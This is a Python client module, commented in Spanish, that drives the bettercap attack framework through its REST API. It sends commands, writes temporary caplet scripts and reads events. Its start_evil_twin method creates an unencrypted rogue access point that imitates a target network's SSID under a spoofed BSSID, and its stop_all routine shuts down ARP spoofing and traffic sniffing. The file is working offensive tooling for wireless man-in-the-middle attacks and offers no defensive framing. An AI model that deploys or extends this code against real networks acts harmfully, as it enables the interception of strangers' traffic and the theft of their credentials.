import aiohttp
import asyncio
import os
from config import BETTERCAP_API_URL, BETTERCAP_API_USER, BETTERCAP_API_PASS, TMP_DIR

class BettercapClient:
    def __init__(self):
        self.base_url = BETTERCAP_API_URL
        self.auth = aiohttp.BasicAuth(BETTERCAP_API_USER, BETTERCAP_API_PASS)
        self.session = None

    async def _get_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(auth=self.auth)
        return self.session

    async def run_command(self, command: str) -> dict:
        """Envía un comando a bettercap vía API REST."""
        session = await self._get_session()
        try:
            async with session.post(
                f"{self.base_url}/api/session",
                json={"cmd": command}
            ) as resp:
                return await resp.json()
        except Exception as e:
            return {"error": str(e)}

    async def run_caplet(self, caplet_name: str, caplet_content: str):
        """Genera un archivo caplet temporal y le dice a bettercap que lo ejecute."""
        caplet_path = os.path.join(TMP_DIR, f"{caplet_name}.cap")
        with open(caplet_path, "w") as f:
            f.write(caplet_content)
        
        return await self.run_command(f"include {caplet_path}")

    async def get_events(self, count: int = 50) -> list:
        session = await self._get_session()
        try:
            async with session.get(
                f"{self.base_url}/api/events",
                params={"n": count}
            ) as resp:
                data = await resp.json()
                return data.get("events", [])
        except:
            return []

    async def start_evil_twin(self, ssid: str, bssid_falso: str, channel: int):
        caplet = f"""
set wifi.ap.ssid {ssid}
set wifi.ap.bssid {bssid_falso}
set wifi.ap.channel {channel}
set wifi.ap.encryption false
wifi.ap on
        """
        return await self.run_caplet(f"eviltwin_{ssid}", caplet)

    async def stop_all(self):
        await self.run_command("wifi.ap off")
        await self.run_command("arp.spoof off")
        await self.run_command("net.sniff off")

bettercap_client = BettercapClient()
